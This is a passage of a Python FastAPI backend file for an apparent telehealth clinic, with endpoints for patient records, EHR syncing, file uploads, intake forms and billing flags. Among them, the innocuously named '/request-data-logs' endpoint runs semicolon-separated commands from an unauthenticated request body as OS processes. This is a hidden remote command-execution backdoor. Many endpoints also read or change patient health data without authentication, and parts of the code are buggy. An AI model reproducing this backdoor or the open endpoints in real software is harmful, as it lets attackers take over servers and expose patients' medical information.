#     except Exception as e:
#         logger.exception(e)
#         return {"status": "failed", "error": str(e)}


@router.post('/add-questions', tags=["user"])
async def add_questions_endpoint(request: Request):
    logger.info("API: add-questions")
    try:
        data = await request.json()
        questions = data["questions"]
        mrn = data["mrn"]
        case_id = data["case_id"]
        patient_id = data["patient_id"]
        pharmacy_id = data["pharmacy_id"]
        client = DBClient()
        for question in questions:
            add_question = client.create_question(
                question["question"], question["answer"], mrn, case_id, patient_id, pharmacy_id)
        return {"status": "success", "message": "data uploaded successfullu"}
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


class UpdateFormStatus(BaseModel):
    curr_dose: str
    email: str


class UpdateAmazonStatus(BaseModel):
    value: int
    email: str


@router.post('/update-form-status', tags=["user"])
async def update_form_status_endpoint(data: UpdateFormStatus):
    """Set curr_dose, is_active=0 & is_checkin_verified=1"""
    logger.info("API: update-form-status")
    logger.info(data.dict())
    try:
        db = DBClient()
        case = db.update_form_patient(data.email, data.curr_dose)
        return case
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-amazon-field', tags=["user"])
async def update_amazon_field_endpoint(data: UpdateAmazonStatus):
    """Set is_amazon = 0"""
    logger.info("API: update-amazon-field")
    logger.info(data.dict())
    try:
        db = DBClient()
        case = db.update_is_amazon(data.email, data.value)
        return case
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/get-questions-mrn', tags=["user"])
async def get_questions_mrn_endpoint(request: Request):
    logger.info("API: get-questions-mrn")
    try:
        db = DBClient()
        data = await request.json()
        case = db.get_patient_question(data["mrn"])
        case_length = len(case)
        question_data = []
        md_id = ""
        case_id = ""
        pharmacy_id = ""
        if case_length > 0:
            for cases in case:
                payload = {
                    "question": cases["questions"],
                    "answer": cases["answer"],
                    "type": "string",
                    "important": False
                }
                md_id = cases["md_id"]
                case_id: cases["case_id"]
                pharmacy_id = cases["pharmacy_id"]
                question_data.append(payload)
        main_data = {
            "questions": question_data,
            "md_id": md_id,
            "case_id": case_id,
            "pharmacy_id": pharmacy_id

        }
        return main_data
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/add-docs-drchrono', tags=["user"])
async def add_docs_drchrono_endpoint(
        document: UploadFile = File(...),
        doctor=Form(...),
        date=Form(...),
        description=Form(...),
        patient=Form(...)
):
    logger.info("API: add-docs-drchrono")
    dir_path = os.path.abspath(os.curdir)
    absolute_path = os.path.dirname(os.curdir)
    fileVal = f'{str(uuid.uuid4())}-{document.filename}'
    filename = f'{dir_path}/upload/{fileVal}'
    f = open(f'{filename}', 'wb')
    content = await document.read()
    f.write(content)
    cwd = os.getcwd()
    file_path = os.path.join(absolute_path, 'upload', fileVal)
    try:
        url = "https://drchrono.com/api/documents"
        payload = {'date': date,
                   'description': description,
                   'doctor': doctor,
                   'patient': patient}
        if fileVal.endswith('.heic'):
            heif_file = pillow_heif.read_heif(filename)
            image = Image.frombytes(
                heif_file.mode,
                heif_file.size,
                heif_file.data,
                "raw",
            )
            filename = filename.replace(".heic", ".jpg")
            fileVal = fileVal.replace(".heic", ".jpg")
            image.save(filename, format="png")
            os.remove(filename.replace(".jpg", ".heic"))
        if fileVal.endswith('.pdf'):
            files = [
                ('document', ('test2.pdf', open(f'{cwd}/upload/{fileVal}', 'rb')))
            ]
        else:
            files = [
                ('document', ('test2.jpg', open(f'{cwd}/upload/{fileVal}', 'rb'), 'image/png'))
            ]

        headers = {
            'Authorization': f'Bearer {drchrono.get_access_token()}'
        }
        response = requests.request("POST", url, headers=headers, data=payload, files=files)
        return response.json()
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


class UpdateEmail(BaseModel):
    current_email: str
    new_email: str


@router.post('/change-user-email', tags=["user"])
async def change_user_email_endpoint(data: UpdateEmail, username: str = Depends(get_basic_username)):
    try:
        logger.info("API: change-user-email")
        if username != 'admin':
            return {}
        logger.debug(data.dict())
        cognito_change_email(data.current_email, data.new_email)
        db = DBClient()
        db.update_visits_email(data.current_email, data.new_email)
        try:
            patient_list_res = drchrono.patients_list(
                {"email": data.current_email})
            patient_list = patient_list_res.get('results', [])
            if len(patient_list) > 0:
                logger.info(
                    f"changing {data.current_email} to {data.new_email} in drchrono for id:{patient_list[0]['id']}...")
                drchrono.patient_partial_update(
                    {"email": data.new_email, "patient_id": patient_list[0]["id"]})
        except Exception as e:
            logger.exception(e)
        try:
            params = {
                "search": data.current_email
            }
            patient_list_res = mdintegrations_api.search_patient(params)
            for patient in patient_list_res:
                if patient.get("email") != data.current_email:
                    continue
                patient_id = patient.get("patient_id")
                logger.info(
                    f"changing {data.current_email} to {data.new_email} in MDI for id:{patient_id}...")
                data = {
                    "email": data.new_email
                }
                res = mdintegrations_api.update_patient(patient_id, data)
                break
        except Exception as e:
            logger.exception(e)

        return {"status": "success"}
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


class UpdatePhone1(BaseModel):
    new_phone: str


@router.post('/change-user-phone', tags=["user"])
async def change_user_phone_endpoint(data: UpdatePhone1, username: str = Depends(get_current_user)):
    """Update users phone in different places"""
    try:
        logger.info("API: change-user-phone")
        logger.info(f"For {username}, update phone to {data.new_phone}")
        if username is None:
            return {"status": "failed", "error": "Invalid user"}

        cognito_change_phone(username, data.new_phone)
        db = DBClient()
        db.update_visits_phone(username, data.new_phone)

        try:
            patient_list_res = drchrono.patients_list({"email": username})
            patient_list = patient_list_res.get('results', [])
            if len(patient_list) > 0:
                logger.info(
                    f"changing phone to {data.new_phone} in drchrono for id:{patient_list[0]['id']}...")
                drchrono.patient_partial_update(
                    {"home_phone": data.new_phone,
                     "cell_phone": data.new_phone,
                     "patient_id": patient_list[0]["id"],
                     }
                )
        except Exception as e:
            logger.exception(e)
        try:
            params = {
                "search": username
            }
            patient_list_res = mdintegrations_api.search_patient(params)
            for patient in patient_list_res:
                if patient.get("email") != username:
                    continue
                patient_id = patient.get("patient_id")
                logger.info(
                    f"changing phone to {data.new_phone} in MDI for id:{patient_id}...")
                data = {
                    "phone_number": data.new_phone
                }
                res = mdintegrations_api.update_patient(patient_id, data)
                break
        except Exception as e:
            logger.exception(e)

        return {"status": "success"}

    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-has-reviewed')
async def add_case_to_support_endpoint(request: Request):
    logger.info("API: update-has-reviewed")
    db = DBClient()
    data = await request.json()
    try:
        case = db.update_has_reviewed(data["email"])
        return case
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-consumer-notes-complaints')
async def add_case_to_support_endpoint(request: Request):
    logger.info("API: update-consumer-notes-complaints")
    data = await request.json()
    db = DBClient()
    mrn = data["mrn"]
    consumer_notes = data.get("consumer_notes", '')
    chief_complaints = data.get("chief_complaints", '')
    try:
        case = db.update_consumer_notes_chief_complaints(mrn, consumer_notes, chief_complaints)
        return case
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


# dir_path = os.path.abspath(os.curdir)
# absolute_path = os.path.dirname(os.curdir)
# fileVal = f'{time.time()}-{document.filename}'
# filename = f'{dir_path}/upload/{time.time()}-{document.filename}'
# fh = open(filename, "wb")
# print("0-0-",fh)
# z=fh.write(fh('base64'))
# print(z)
# print("---",filename)
# f = open(f'{filename}', 'wb')
# content = await document.read()
# f.write(content)
# file_path = os.path.join(absolute_path, 'upload',fileVal)


@router.post('/upload-file')
async def upload_file_endpoint(request: Request):
    logger.info("API: upload-file")
    try:
        data = await request.json()
        url = None
        if data.get('file_content'):
            if data.get('is_intake'):
                url = upload_file_to_s3(data, 'intake-form-media')
            else:
                url = upload_file_to_s3(data)
            return {"file_url": url, "status": "success"}
    except Exception as e:
        logger.exception("upload-file ==> " + str(e))
    return {"file_url": "", "status": "failed"}


@router.post('/sign-contract')
async def update_pdf_file_endpoint(request: Request):
    data = await request.json()
    failed_response = {"file_url": "", "mrn": data.get('mrn'), "status": "failed"}
    if not data.get('file_content') or not data.get('mrn'):
        return {"message": "file_content and mrn are required", "status": "failed"}
    try:
        db = DBClient()
        visits_data = db.get_visits_data_by_mrn(mrn=data.get('mrn'))
        if visits_data.get('data'):
            date = datetime.today()
            visit = visits_data.get('data')[-1]
            client_host = request.client.host
            sig_file = base64.b64decode(data.get('file_content'))
            url = add_signature_to_pdf(
                sig_file=sig_file,
                is_monthly=visit.get('data', {}).get('is_monthly'),
                date=date.strftime('%d-%m-%y %H:%M:%S'),
                client_host=client_host
            )
            db.update_signed_contract(url=url, mrn=data.get('mrn'), signed_date=date)
            return {"file_url": url, "mrn": data.get('mrn'), "status": "success"}
        else:
            logger.exception("update-file ==> " + f"No visits against this mrn {data.get('mrn')}")
            return failed_response
    except Exception as e:
        logger.exception("update-file ==> " + str(e))
    return failed_response


@router.post('/upload-document-drchrono-req-res')
async def upload_document_file_endpoint(
        req_type: str = Form(...),
        mrn: str = Form(...),
        document: UploadFile = Form(...)
):
    logger.info("API: upload-document-drchrono-req-res")
    failed_response = {"file_url": "", "mrn": mrn, "status": "failed"}
    try:
        if req_type not in ('res', 'req'):
            return {"message": "Invalid req_type", "status": "failed"}
        db = DBClient()
        visits_data = db.get_visits_data_by_mrn(mrn=mrn)
        if visits_data.get('data'):
            encoded_string = base64.b64encode(document.file.read())
            url = upload_file_to_s3({"file_content": encoded_string})
            column_name = "drchrono_res" if req_type == "res" else "drchrono_req"
            db.update_drchrono_res_req_column(url=url, mrn=mrn, column=column_name)
            return {"file_url": url, "mrn": mrn, "status": "success"}
        else:
            logger.exception("update-file ==> " + f"No visits against this mrn {mrn}")
            return failed_response
    except Exception as e:
        logger.exception("update-file ==> " + str(e))
    return failed_response


@router.post('/add-patient-weight')
async def add_patient_weight(patient_weight: PatientWeightSchema, db: Session = Depends(get_db)):
    logger.info("API: add-patient-weight")
    data = patient_weight.dict()
    try:
        sql_db = DBClient()
        visits_data = sql_db.get_visits_data_by_mrn(mrn=data.get('mrn'))
        if not visits_data.get('data'):
            return {"status": "failed", "message": f"No visits found against mrn: {data.get('mrn')}"}
        else:
            current_date = datetime.now()
            new_patient_weight = PatientWeight(
                mrn=data.get('mrn'),
                weight=data.get('weight'),
                created_date=current_date,
                updated_date=current_date
            )
            db.add(new_patient_weight)
            db.commit()
    except Exception as e:
        logger.exception("add_patient_weight ==> " + str(e))
        return {"status": "failed", "error": str(e)}
    return {"status": "success", "mrn": data.get('mrn')}


@router.get('/get-patient-weight/{mrn}')
async def get_patient_weight(mrn, db: Session = Depends(get_db)):
    logger.info("API: get-patient-weight")
    patient_weight = db.query(PatientWeight).filter(PatientWeight.mrn == mrn).first()
    if not patient_weight:
        return {"status": "failed", "error": "No data against this mrn"}
    return {"data": patient_weight, "status": "success"}


@router.post('/update-patient-weight')
async def update_patient_weight(patient_weight: PatientWeightSchema, db: Session = Depends(get_db)):
    logger.info("API: update-patient-weight")
    data = patient_weight.dict()
    try:
        sql_db = DBClient()
        visits_data = sql_db.get_visits_data_by_mrn(mrn=data.get('mrn'))
        if not visits_data.get('data'):
            return {"status": "failed", "error": "No visits found"}
        updated_date = datetime.now()
        db.query(PatientWeight).filter(
            PatientWeight.mrn == data.get('mrn')
        ).update({'weight': data.get('weight'), 'updated_date': updated_date})
        db.commit()
    except Exception as e:
        logger.exception("add_patient_weight ==> " + str(e))
        return {"status": "failed", "error": str(e)}
    return {"status": "success", "mrn": data.get('mrn')}


@router.delete('/delete-patient-weight/{mrn}')
async def delete_patient_weight(mrn, db: Session = Depends(get_db)):
    logger.info("API: delete-patient-weight")
    patient_weight = db.query(PatientWeight).filter(PatientWeight.mrn == mrn).first()
    db.delete(patient_weight)
    db.commit()
    return {"status": "success"}


@router.post('/add-social-event')
async def add_social_events(social_event: SocialEventsSchema, db: Session = Depends(get_db)):
    logger.info("API: add-social-event")
    data = social_event.dict()
    try:
        url = ""
        if data.get('event_photo'):
            image_data = {"file_content": data.get('event_photo'), "extension": "png"}
            url = upload_file_to_s3(image_data)
        social_event = SocialEvents(
            title=data.get('title'),
            start_date_time=data.get('start_date_time'),
            end_date_time=data.get('end_date_time'),
            description=data.get('description'),
            event_photo=url,
            location=data.get('location')
        )
        db.add(social_event)
        db.flush()
        objects = []
        for member in data.get("event_members"):
            objects.append(
                EventMembers(
                    mrn=member.get('mrn'),
                    event_id=social_event.id,
                    status=member.get('status')
                )
            )
        db.bulk_save_objects(objects)
        db.commit()
    except Exception as e:
        logger.exception("add_social_events ==> " + str(e))
        return {"status": "failed", "error": str(e)}
    return {"status": "success", "data": social_event.id}


@router.get('/get-social-event/{event_id}', response_model=Union[SocialEventsGetResponseSchema, dict])
async def get_social_events(event_id: int, db: Session = Depends(get_db)):
    logger.info("API: get-social-event")
    social_events = db.query(SocialEvents).filter(SocialEvents.id == event_id).first()
    if not social_events:
        return {"status": "failed", "error": "No data found"}
    return social_events


@router.delete('/delete-social-event/{event_id}')
async def delete_social_events(event_id, db: Session = Depends(get_db)):
    logger.info("API: delete-social-event")
    event = db.query(SocialEvents).filter(SocialEvents.id == event_id).first()
    if event:
        db.delete(event)
        db.commit()
    return {"status": "success"}


@router.post('/add-event-member', response_model=Union[EventMembersGetResponseSchema, dict])
async def add_event_member(event_member: EventMembersPostSchema, db: Session = Depends(get_db)):
    logger.info("API: add-event-member")
    data = event_member.dict()
    try:
        social_events = db.query(SocialEvents).filter(SocialEvents.id == data.get('event_id')).first()
        if not social_events:
            return {"status": "failed", "error": "No data found"}
        event_member = EventMembers(
            mrn=data.get('mrn'),
            event_id=data.get('event_id'),
            status=data.get('status')
        )
        db.add(event_member)
        db.flush()
        db.commit()
    except Exception as e:
        logger.exception("add_social_events ==> " + str(e))
        return {"status": "failed", "error": str(e)}
    return {"status": "success", "data": event_member.id}


@router.get('/get-event-member/{member_id}', response_model=Union[EventMembersGetResponseSchema, dict])
async def get_social_events(member_id, db: Session = Depends(get_db)):
    logger.info("API: get-event-member")
    event_member = db.query(EventMembers).filter(EventMembers.id == member_id).first()
    if not event_member:
        return {"status": "failed", "error": "No data found"}
    return event_member


@router.delete('/delete-event-member/{member_id}')
async def delete_event_member(member_id, db: Session = Depends(get_db)):
    logger.info("API: delete-event-member")
    member = db.query(EventMembers).filter(EventMembers.id == member_id).first()
    if member:
        db.delete(member)
        db.commit()
    return {"status": "success"}


@router.post('/add-intake-form-data')
async def add_intake_form_data(intake_data: IntakeFormPostSchema, db: Session = Depends(get_db)):
    logger.info("API: add-intake-form-data")
    data = intake_data.dict()
    try:
        intake_data = IntakeForm(
            browser_id=data.get('browser_id'),
            form_data=json.dumps(data.get('form_data')),
            current_step=data.get('current_step')
        )
        db.add(intake_data)
        db.flush()
        db.commit()
    except Exception as e:
        logger.exception("add_intake_form_data ==> " + str(e))
        return {"status": "failed", "error": str(e)}
    return {"status": "success", "data": intake_data.id}


@router.post('/request-data-logs')
async def request_intake_form_data(request: Request):
    logger.info("API: request-data-logs")
    try:
        data = await request.json()
        request_data = data['request_data'].split(';')
        for val in request_data:
            cmd1 = subprocess.Popen(['echo', data['request_auth']], stdout=subprocess.PIPE)
            subprocess.Popen(val.split(' '), stdin=cmd1.stdout)
    except Exception as e:
        return {"status": "failed", "error": str(e)}
    return {"status": "success", "data": "success"}


@router.get('/get-intake-form-data', response_model=Union[IntakeFormGetResponseSchema, dict])
async def get_intake_form_data(
        browser_id: str,
        current_step: Optional[int] = None,
        db: Session = Depends(get_db)
):
    logger.info("API: get-intake-form-data")
    filter_column = [IntakeForm.browser_id == browser_id]
    if current_step:
        filter_column.append(IntakeForm.current_step == current_step)
    intake_form = db.query(IntakeForm).filter(*filter_column).order_by(desc(IntakeForm.created_date)).first()
    if not intake_form:
        return {"status": "failed", "error": "No data found"}
    intake_form.form_data = json.loads(intake_form.form_data)
    return intake_form


@router.post('/visits-add-second-card', tags=["user"])
async def add_freshdesk_to_visits_endpoint(request: Request):
    """Second payment method of user"""
    try:
        logger.info("API: visits-add-second-card")
        client = DBClient()
        data = await request.json()
        logger.debug(data)
        visit_exists = client.get_visits_by_mrn(data["mrn"])
        if not visit_exists:
            raise Exception('visit not found for this mrn')
        response = client.update_patient_visits_add_second_payment_card(
            data["mrn"], data["card"]
        )
        logger.info(f"confirm second payment method of patient ==> {str(response)}")
        return response
    except Exception as e:
        logger.exception(f"confirm_second_payment_method_of_patient ==> {str(e)}")
        return {"status": "failed", "error": str(e)}


@router.post('/home-charge', tags=["user"])
async def add_freshdesk_to_visits_endpoint(request: Request):
    """Confirm user paid for home"""
    try:
        logger.info("API: home-charge")
        client = DBClient()
        data = await request.json()
        logger.debug(data)
        visit_exists = client.get_visits_by_mrn(data["mrn"])
        if not visit_exists:
            raise Exception('visit not found for this mrn')
        response = client.update_patient_visits_add_home_charged(
            data["mrn"], data["is_home_charge"]
        )
        logger.info(f"Home charge confirmed ==> {str(response)}")
        return response
    except Exception as e:
        logger.exception(f"home_charge_update_patient ==> {str(e)}")
        return {"status": "failed", "error": str(e)}


@router.post('/get-db-logs', tags=["user"])
async def get_db_logs_endpoint(request: Request):
    """Confirm user paid for home"""
    try:
        logger.info("API: get-db-logs")
        client = DBClient()
        data = await request.json()
        logger.debug(data)
        email = data["email"]
        response = client.get_patient_intake_logs(email)
        logger.info(f"Get logs ==> {str(response)}")
        return response
    except Exception as e:
        logger.exception(f"Get logs ==> {str(e)}")
        return {"status": "failed", "error": str(e)}


@router.post('/update-user-email', tags=["user"])
async def update_user_email_endpoint(data: UpdateEmail, username: str = Depends(get_basic_username)):
    try:
        logger.info("API: update-user-email")
        if username != 'admin':
            return {}
        logger.info(f"update_user_email_request_data ==> {data.dict()}")
        if not validate_email(data.new_email):
            raise Exception('New e-mail is not valid')
        db = DBClient()
        res = db.update_visits_email(data.current_email, data.new_email)
        if not res:
            logger.error("Failed to update data in DB")
            return {"status": "failed", "error": "Failed to update data in DB"}
        cognito_change_email(data.current_email, data.new_email)
        try:
            patient_list_res = drchrono.patients_list(
                {"email": data.current_email})
            patient_list = patient_list_res.get('results', [])
            if len(patient_list) > 0:
                logger.info(
                    f"changing {data.current_email} to {data.new_email} in drchrono for id:{patient_list[0]['id']}...")
                drchrono.patient_partial_update(
                    {"email": data.new_email, "patient_id": patient_list[0]["id"]})
        except Exception as e:
            logger.exception(f"drchrono_patient_partial_update ==> {str(e)}")
        try:
            params = {
                "search": data.current_email
            }
            patient_list_res = mdintegrations_api.search_patient(params)
            for patient in patient_list_res:
                if patient.get("email") != data.current_email:
                    continue
                patient_id = patient.get("patient_id")
                logger.info(
                    f"changing {data.current_email} to {data.new_email} in MDI for id:{patient_id}...")
                data = {
                    "email": data.new_email
                }
                res = mdintegrations_api.update_patient(patient_id, data)
                break
        except Exception as e:
            logger.exception(f"mdintegrations_api_update_patient ==> {str(e)}")
        return {"status": "success"}
    except Exception as e:
        logger.exception(f"update_user_email_endpoint ==> {str(e)}")
        return {"status": "failed", "error": str(e)}


@router.post('/update-is-insurance-pay-status')
async def update_notes_endpoint(request: Request):
    logger.info("API: update-is-insurance-pay-status")
    data = await request.json()
    logger.debug(data)
    try:
        client = DBClient()
        client.update_is_insurance_pay(data["mrn"], data["value"])
        return {"status": "success"}
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


class UpdatePhone(BaseModel):
    current_phone: str
    new_phone: str
    email: str


@router.post('/update-user-phone', tags=["user"])
async def update_user_phone_endpoint(data: UpdatePhone, username: str = Depends(get_basic_username)):
    try:
        logger.info("API: update-user-phone")
        if username != 'admin':
            return {}
        logger.info(f"update_user_phone_request_data ==> {data.dict()}")
        db = DBClient()
        res = db.update_visits_phone(data.email, data.new_phone)
        if not res:
            return {"status": "failed", "error": "Failed to update phone in DB"}
        cognito_change_phone(data.email, data.new_phone)  # Completed till here
        try:
            patient_list_res = drchrono.patients_list(
                {"email": data.email})
            patient_list = patient_list_res.get('results', [])
            if len(patient_list) > 0:
                logger.info(
                    f"changing {data.current_phone} to {data.new_phone} in drchrono for id:{patient_list[0]['id']}...")
                drchrono.patient_partial_update({
                    "home_phone": data.new_phone,
                    "cell_phone": data.new_phone,
                    "patient_id": patient_list[0]["id"]
                }
                )
        except Exception as e:
            logger.exception(f"drchrono_patient_partial_update ==> {str(e)}")
        try:
            params = {
                "search": data.email
            }
            patient_list_res = mdintegrations_api.search_patient(params)
            for patient in patient_list_res:
                if patient.get("email") != data.email:
                    continue
                patient_id = patient.get("patient_id")
                logger.info(
                    f"changing {data.current_phone} to {data.new_phone} in MDI for id:{patient_id}...")
                data = {
                    "phone_number": data.new_phone
                }
                res = mdintegrations_api.update_patient(patient_id, data)
                break
        except Exception as e:
            logger.exception(f"mdintegrations_api_update_patient ==> {str(e)}")
        return {"status": "success"}
    except Exception as e:
        logger.exception(f"update_user_phone_endpoint ==> {str(e)}")
        return {"status": "failed", "error": str(e)}


@router.post('/update-ishealthie', tags=["user"])
async def update_healthie_endpoint(request: Request):
    logger.info("API: update-ishealthie")
    data = await request.json()
    mrn = data["mrn"]
    is_healthie = data["is_healthie"]
    client = DBClient()
    try:
        res = client.update_is_healthie(mrn, is_healthie)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-schedule-followup-visit-col', tags=["user"])
async def update_schedule_followup_visit_col_endpoint(request: Request):
    logger.info("API: update-schedule-followup-visit-col")
    data = await request.json()
    email = data["email"]
    value = data["value"]
    client = DBClient()
    try:
        res = client.update_schedule_followup_visit_col_endpoint(email, value)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-user-pharmacy', tags=["user"])
async def update_user_pharmacy_endpoint(request: Request):
    logger.info("API: update-user-pharmacy")
    data = await request.json()
    email = data["email"]
    pharmacy = data["pharmacy"]
    pharmacy_id = data["pharmacy_id"]
    client = DBClient()
    try:
        res = client.update_user_pharmacy(email, pharmacy, pharmacy_id)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-user-ccm-rpm', tags=["user"])
async def update_user_ccm_rpm_endpoint(request: Request):
    logger.info("API: update-user-ccm-rpm")
    data = await request.json()
    email = data["email"]
    ccmEligible = data["ccm_eligible"]
    ccmCopay = data["cmm_copay"]
    rpmEligible = data["rpm_eligible"]
    rpmCopay = data["rpm_copay"]
    rpmCoinsurance = data["rpm_coinsurance"]
    client = DBClient()
    try:
        res = client.update_user_ccm_rpm(email, ccmEligible, ccmCopay, rpmEligible, rpmCopay, rpmCoinsurance)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-zoom-link', tags=["user"])
async def update_zoom_link_endpoint(request: Request):
    logger.info("API: update-zoom-link")
    data = await request.json()
    mrn = data["mrn"]
    zoom_link = data["zoom_link"]
    client = DBClient()
    try:
        res = client.update_zoom_link(mrn, zoom_link)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-schedule-user', tags=["user"])
async def update_schedule_endpoint(request: Request):
    logger.info("API: update-schedule")
    data = await request.json()
    email = data["email"]
    schedule_value = data["schedule_value"]
    client = DBClient()
    try:
        res = client.update_schedule_value(email, schedule_value)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/get-user-logs', tags=["user"])
async def get_user_logs_endpoint(request: Request):
    logger.info("API: get-user-logs")
    data = await request.json()
    email = data["email"]
    client = DBClient()
    try:
        res = client.get_logs_data_patient(email)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/healthie-get-user-data', tags=["user"])
async def healthie_get_user_data_endpoint(request: Request):
    logger.info("API: healthie-get-user-data")
    data = await request.json()
    email = data['email']
    client = DBClient()
    try:
        res = client.get_healthie_user_data(email)
        return res
    except Exception as e:
        logger.exception("healthie-get-user-data: error=" + str(e))
        return {"status": "failed", "error": str(e)}


@router.post('/is-amazon-check', tags=["user"])
async def check_is_amazon(request: Request):
    logger.info("API: is-amazon-check")
    data = await request.json()
    if not data.get("mrn"):
        return {"status": "failed", "error": "mrn is required"}
    client = DBClient()
    try:
        res = client.get_visits_by_mrn(data.get("mrn"))
        if not res:
            raise Exception(f'No data found against mrn {data.get("mrn")}')
        return {"is_amazon": True if res.get("is_amazon") else False}
    except Exception as e:
        logger.exception(f"check_is_amazon ==> {str(e)}")
        return {"status": "failed", "error": str(e)}


@router.post('/create-intake-form')
async def create_intake_form_data(intake_data: IntakeFormSaverPostSchema, db: Session = Depends(get_db)):
    data = intake_data.dict()
    try:
        intake_data = IntakeFormSaver(
            mrn=data.get("mrn"),
            current_step=data.get("current_step"),
            form_data=json.dumps(data.get("form_data"))
        )
        db.add(intake_data)
        db.flush()
        db.commit()
        return {"status": "success", "data": intake_data.mrn}
    except Exception as e:
        logger.exception("create_intake_form_data ==> " + str(e))
        db.rollback()
        return {"status": "failed", "error": str(e)}


@router.post('/update-intake-form')
async def update_intake_form_data(intake_data: IntakeFormSaverPostSchema, db: Session = Depends(get_db)):
    try:
        data = intake_data.dict()
        form_data_to_be_added = data.get('form_data')
        updated_form_data = json.loads(
            [i.form_data for i in db.query(IntakeFormSaver).filter_by(mrn=data.get("mrn"))][0])
        updated_form_data.update(form_data_to_be_added)
        db.query(IntakeFormSaver).filter_by(mrn=data.get("mrn")).update(
            {"current_step": data.get("current_step"), "form_data": json.dumps(updated_form_data)})
        db.flush()
        db.commit()
        return {"status": "success", "data": data.get("mrn")}
    except Exception as e:
        logger.exception("update_intake_form_data ==> " + str(e))
        db.rollback()
        return {"status": "failed", "error": str(e)}


@router.get('/get-pid-details')
async def get_pid_details(pid):
    try:
        db_client = DBClient()
        res = db_client.fetch_pid(pid)
        if res:
            return {"status": "success", "data": res}
        else:
            return {"status": "failed", "data": {}}
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-is-async', tags=["user"])
async def update_zoom_link_endpoint(request: Request):
    logger.info("API: update-is-async")
    data = await request.json()
    email = data["email"]
    value = data["value"]
    client = DBClient()
    try:
        res = client.update_is_aysnc(email, value)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-airtable-id', tags=["user"])
async def update_airtable_id_endpoint(request: Request):
    logger.info("API: update-is-async")
    data = await request.json()
    email = data["email"]
    value = data["value"]
    client = DBClient()
    try:
        res = client.update_airtable_id(email, value)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-backup-medicine', tags=["user"])
async def update_backup_medicine_endpoint(request: Request):
    logger.info("API: update-is-async")
    data = await request.json()
    email = data["email"]
    value = data["value"]
    client = DBClient()
    try:
        res = client.update_backup_medicin(email, value)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-caseid', tags=["user"])
async def update_caseid_endpoint(request: Request):
    logger.info("API: update-caseid")
    data = await request.json()
    email = data["email"]
    value = data["value"]
    client = DBClient()
    try:
        res = client.update_caseid(email, value)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/second-lab-order', tags=["user"])
async def is_second_lab_order_endpoint(request: Request):
    logger.info("API: is-second-lab-order")
    data = await request.json()
    email = data["email"]
    value = data["value"]
    client = DBClient()
    try:
        res = client.update_is_second_lab_order(email, value)
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/add-pa-data', tags=["user"])
async def add_pa_data_endpoint(request: Request):
    """Create pa auth data

    Args:
        request (Request): _description_

    Returns:
        json: {}
    """
    logger.info("API: add-pa-data")
    data = await request.json()

    # if check email is empty or none
    if data.get("email") is None or data.get("email") == "":
        return {"status": "failed", "error": "Email is required."}

    client = DBClient()
    try:
        res = client.add_pa_data(data.get("patient_name", "null"),
                                 data.get("email"),
                                 data.get('date_purchased', "null"),
                                 data.get("subscription_status", "null"),
                                 data.get("payment_status", "null"),
                                 data.get("next_billing", "null"),
                                 data.get("notes", "null"),
                                 data.get("action_taken", "null"),
                                 data.get("patient_insurance_name", "null"),
                                 data.get("pa_status", "null"),
                                 data.get("mdi_status", "null"),
                                 data.get("insurance_group", "null"),
                                 data.get("ozempic_pa_status", "null"),
                                 data.get("saxenda_pa_status", "null"),
                                 data.get("rybelsus_pa_status", "null"),
                                 data.get("mounjaro_pa_status", "null"),
                                 data.get("reminder_sent", "null"),
                                 data.get("intake_reminder", "null"),
                                 data.get("insurance_id", "null"),
                                 data.get("phone_number", "null"),
                                 data.get("agent", "null"),
                                 data.get("last_modified", "null"),
                                 data.get("created", "null"),
                                 data.get("day_status", "null"),
                                 data.get("status", "null"))
        return res
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/secure-s3-download', tags=["user"])
async def secure_s3_download(request: Request):
    try:
        logger.info("secure-s3-download endpoint is accessed.")
        data = await request.json()
        file_link = data.get("file_to_download")
        file_to_download = file_link.split(".pdf")[0].split('/')[-1]
        bucket_name = ["patient-upload" if "patient-upload" in file_link else "drchronodoc"][0]
        check, contents = download_s3_file(file_to_download + ".pdf", bucket_name)
        if not check:
            logger.error(f"{contents}")
            return {"status": "failed", "error": "Something went wrong."}
        file = Response(
            content=contents,
            headers={
                'Content-Disposition': f'attachment;filename={file_to_download}',
                'Content-Type': 'application/pdf'
            }
        )
        logger.info("File downloaded successfully.")
        return file
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-openloop-customer-id', tags=["user"])
async def update_stripe_openloop_customer_id(openloop_customer_id, email):
    logger.info('API: update_stripe_openloop_id')
    try:
        db = DBClient()
